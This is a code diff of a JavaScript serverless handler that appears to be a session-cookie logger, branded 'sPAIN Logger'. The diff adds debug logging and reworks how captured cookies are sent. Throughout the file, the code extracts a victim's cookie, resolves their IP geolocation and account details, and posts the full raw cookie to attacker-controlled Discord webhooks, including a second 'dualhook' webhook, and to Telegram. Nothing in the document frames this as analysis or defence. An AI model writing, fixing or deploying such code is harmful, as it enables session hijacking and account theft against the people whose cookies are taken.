@@ -269,34 +269,61 @@ const WH_NAME   = 'sPAIN';
 const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
 
 async function discordSend(url, payload) {
-  if (!url || !url.includes('discord.com/api/webhooks')) return;
+  if (!url || !url.includes('discord.com/api/webhooks')) {
+    console.log('Invalid webhook URL:', url);
+    return;
+  }
   try {
     const res = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-    if (!res.ok) console.error('Discord error:', res.status);
-  } catch (e) { console.error('Discord fetch error:', e.message); }
+    if (!res.ok) {
+      const text = await res.text();
+      console.error('Discord HTTP error:', res.status, text);
+    } else {
+      console.log('Discord sent successfully to:', url.substring(0, 50));
+    }
+  } catch (e) { 
+    console.error('Discord fetch error:', e.message); 
+  }
 }
 
-// FULL COOKIE in refresh URL - no truncation!
-async function discordSendCookie(url, cookie, username) {
-  if (!url?.includes('discord.com/api/webhooks')) return;
+// Send raw cookie with refresh link - FIXED VERSION
+async function sendRawCookie(url, cookie, username) {
+  console.log('Sending raw cookie to:', url?.substring(0, 50));
+  
+  if (!url || !url.includes('discord.com/api/webhooks')) {
+    console.log('Skipping invalid URL');
+    return;
+  }
+  
   try {
-    // Send FULL cookie in URL (not truncated)
     const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)}`;
+    const content = `**🔐 Cookie for "${username || 'Unknown'}"**\n\nYou need to refresh this cookie to work here: [Refresh Cookie](${refreshUrl})\n\n\`\`\`\n${cookie}\n\`\`\``;
     
-    await fetch(url, {
+    console.log('Content length:', content.length);
+    
+    const res = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         username: WH_NAME,
         avatar_url: WH_AVATAR,
-        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${refreshUrl})**\n\n\`\`\`\n${cookie}\n\`\`\``
+        content: content
       })
     });
-  } catch (e) { console.error('Cookie send error:', e); }
+    
+    if (!res.ok) {
+      const text = await res.text();
+      console.error('Raw cookie send failed:', res.status, text);
+    } else {
+      console.log('Raw cookie sent successfully');
+    }
+  } catch (e) { 
+    console.error('Raw cookie error:', e.message);
+  }
 }
 
 export default async function handler(req, res) {
@@ -309,6 +336,9 @@ export default async function handler(req, res) {
   const body = parseBody(req.body);
   const { slug, slots, action } = body;
   
+  console.log('=== NEW REQUEST ===');
+  console.log('Slug:', slug, 'Action:', action);
+  
   if (action === 'check_account' || action === 'refresh_cookie') {
     if (!slots) return res.status(400).json({ error: 'slots required' });
     const cookie = findCookie(slots);
@@ -319,6 +349,8 @@ export default async function handler(req, res) {
   if (!slug || !slots) return res.status(400).json({ error: 'slug and slots required' });
 
   const record = await redisGet(`slot:${slug}`);
+  console.log('Record found:', !!record);
+  
   if (!record) return res.status(404).json({ error: 'Page not found' });
   if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });
 
@@ -332,15 +364,23 @@ export default async function handler(req, res) {
   const pName = record.displayName || slug;
   const cookie = findCookie(slots);
 
+  console.log('Cookie found:', !!cookie, 'IP:', ip);
+
   let webhook1 = null;
   let webhook2 = record.webhook;
+  console.log('Webhook2 (main):', webhook2?.substring(0, 50));
+  
   if (record.dualhookParent) {
     const parent = await redisGet(`slot:${record.dualhookParent}`);
-    if (parent?.webhook && parent.webhook !== record.webhook) webhook1 = parent.webhook;
+    if (parent?.webhook && parent.webhook !== record.webhook) {
+      webhook1 = parent.webhook;
+      console.log('Webhook1 (dualhook):', webhook1?.substring(0, 50));
+    }
   }
 
   // NO COOKIE
   if (!cookie) {
+    console.log('No cookie - sending troll alert');
     const geo = await getIpGeo(ip);
     const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
     
@@ -365,6 +405,7 @@ export default async function handler(req, res) {
   }
 
   // Process valid cookie
+  console.log('Processing valid cookie...');
   const [geo, accountInfo] = await Promise.all([
     getIpGeo(ip),
     refreshCookieStatus(cookie)
@@ -374,7 +415,10 @@ export default async function handler(req, res) {
   const acc = accountInfo.refreshed ? accountInfo.account : null;
   const avatarUrl = acc?.avatarUrl;
 
-  // WEBHOOK 2: Cookie Captured
+  console.log('Account valid:', !!acc, 'Username:', acc?.username);
+
+  // 1. WEBHOOK 2: Cookie Captured
+  console.log('Step 1: Sending cookie captured...');
   await discordSend(webhook2, {
     username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
     embeds: [{
@@ -394,8 +438,9 @@ export default async function handler(req, res) {
     }]
   });
 
-  // WEBHOOK 1: Dualhook
+  // 2. WEBHOOK 1: Dualhook (if exists)
   if (webhook1) {
+    console.log('Step 2: Sending dualhook...');
     await discordSend(webhook1, {
       username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
       embeds: [{
@@ -414,8 +459,9 @@ export default async function handler(req, res) {
     });
   }
 
-  // Account Info
+  // 3. Account Info
   if (acc) {
+    console.log('Step 3: Sending account info...');
     const accountEmbed = {
       title: '✅ Account Info Valid',
       description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
@@ -443,11 +489,15 @@ export default async function handler(req, res) {
     if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
   }
 
-  // ONLY place with refresh link - raw cookie message (FULL COOKIE)
-  await discordSendCookie(webhook2, cookie, acc?.username);
-  if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);
+  // 4. RAW COOKIE with refresh link - THIS IS THE KEY PART
+  console.log('Step 4: Sending raw cookie with refresh link...');
+  console.log('Cookie length:', cookie?.length);
+  
+  await sendRawCookie(webhook2, cookie, acc?.username);
+  if (webhook1) await sendRawCookie(webhook1, cookie, acc?.username);
 
   // Telegram
+  console.log('Step 5: Sending to Telegram...');
   if (acc) {
     await tgSendAccount([
       `🍪 <b>COOKIE — ${pName}</b>`,
@@ -466,5 +516,6 @@ export default async function handler(req, res) {
     await tgSendAccount(`🍪 <b>COOKIE — ${pName}</b>\n❌ <b>Invalid cookie</b>\n<code>${cookie}</code>`);
   }
 
+  console.log('=== REQUEST COMPLETE ===');
   return res.status(200).json({ success: true, account: acc });
 }
